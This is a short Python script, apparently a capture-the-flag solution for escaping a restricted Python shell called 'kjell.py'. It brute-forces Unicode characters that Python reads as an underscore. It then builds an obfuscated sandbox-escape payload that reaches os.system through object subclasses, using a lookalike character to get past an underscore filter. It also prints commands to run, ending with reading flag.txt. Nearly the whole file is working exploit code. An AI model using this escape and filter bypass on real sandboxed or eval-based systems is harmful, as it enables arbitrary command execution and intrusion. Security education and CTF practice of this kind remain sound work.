#!/usr/bin/env python3

def bruteforce_unicode():
	"""
	Bruteforce unicode character that for some reasong gets interpretet as double underscore __ in python

	Should return the following:
		95 0x5f _
        65075 0xfe33 ︳
        65076 0xfe34 ︴
        65101 0xfe4d ﹍
        65102 0xfe4e ﹎
        65103 0xfe4f ﹏
        65343 0xff3f ＿
	"""
	for i in range(0x110000):
		try:
			c = chr(i)
			eval('_' + c + 'builtins_' + c)
			print(i, hex(i), c)
		except:
			pass


# bruteforce_unicode()
dunder = '_' + chr(0xfe4f)
# one random example of how to get terminal execution without builtins or globals
system = "system = [c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['_'+'_im'+'port_'+'_']('os').system"
system = system.replace('__', dunder)
print("Paste into kjell.py terminal:")
print(system)
print("system('id')")
print("system('ls')")
print("system('cat flag.txt')")
